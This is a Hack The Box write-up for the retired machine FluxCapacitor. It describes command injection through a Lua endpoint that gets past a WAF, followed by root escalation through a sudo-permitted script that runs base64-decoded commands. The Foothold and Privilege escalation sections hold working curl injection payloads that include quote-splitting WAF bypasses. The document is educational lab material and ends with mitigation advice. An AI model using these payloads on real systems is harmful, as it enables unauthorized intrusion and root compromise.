---
machine: FluxCapacitor
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, web, command-injection, waf, sudo, lua]
---

# FluxCapacitor — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference note; no real flags or credentials.

## TL;DR

The `/sync` endpoint passes the `opt` parameter to Lua `io.popen`. A WAF blocks common characters and browser agents, but single quotes and word splitting allow command injection as `nobody`. `sudo -l` authorizes a `.monit` script that base64-decodes and runs commands as root.

## Recon

```bash
nmap -Pn -sCV -p80 <IP>
```

- Ports: `80/tcp` HTTP.
- Services: OpenResty with Lua and a ModSecurity-based WAF.
- Technologies: Lua, OpenResty, ModSecurity, bash and sudo.

## Enumeration

- Minimal page with the `/sync` hint.
- The `opt` parameter returns the system time.
- The WAF blocks `;`, `|`, `$`, `(`, `)` and browser User-Agents.
- The command runs as `nobody`.

## Foothold

Break the command's quoting context and split words with empty single quotes. The response reflects command output, exposing users and the `.monit` script.

```bash
curl "http://fluxcapacitor.htb/sync?opt=' su''do -l'"
curl "http://fluxcapacitor.htb/sync?opt=' c''at /home/themiddle/.monit'"
# The WAF needs a raw request; modern curl may require --path-as-is
```

## Lateral movement

There is no second host: the pivot is from the web service's `nobody` user to `themiddle` and root through the authorized script.

## Privilege escalation

`.monit` accepts `cmd` plus base64, decodes it and runs it with `bash -c`. `sudo` allows invoking it without a password as root.

```bash
PAYLOAD=$(printf 'cat /root/root.txt' | base64 -w0)
curl "http://fluxcapacitor.htb/sync?opt=' su''do /home/themiddle/.monit cmd $PAYLOAD'"
```

## Evidence

- `id` and `sudo -l` output through `/sync`.
- `.monit` script contents.
- Privileged file read as root.

## Lessons learned

- A WAF does not fix command concatenation.
- Privileged scripts that decode input are direct RCE.
- Character filters are bypassed with equivalent syntax.

## Mitigation and detection

- Do not build shell commands from user input; use process APIs with argument arrays.
- Remove `sudo` from scripts that accept commands.
- Audit WAF rules and enforce validation in code, not only at the edge.

## References

- [0xdf — FluxCapacitor](https://0xdf.gitlab.io/2018/05/12/htb-fluxcapacitor.html)
- [IppSec — FluxCapacitor](https://www.youtube.com/watch?v=XLIBbkQJKuY)
- [Hack The Box — FluxCapacitor](https://app.hackthebox.com/machines/fluxcapacitor)
